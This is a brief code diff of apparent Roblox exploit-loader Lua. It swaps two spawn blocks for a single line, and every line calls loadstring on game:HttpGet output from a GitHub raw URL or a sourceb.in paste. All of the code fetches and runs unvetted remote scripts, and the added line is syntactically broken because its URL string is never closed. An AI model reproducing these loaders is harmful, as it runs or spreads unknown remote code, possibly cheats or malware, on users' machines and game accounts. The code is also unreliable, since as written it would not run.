@@ -1,7 +1,1 @@
-spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroxScripts/DeItaSupported/refs/heads/main/Gwapo"))()
-end)
-
-spawn(function()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/dfRL15ZAQn/0"))()
-end)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/lvbxH1wYtf/0))()
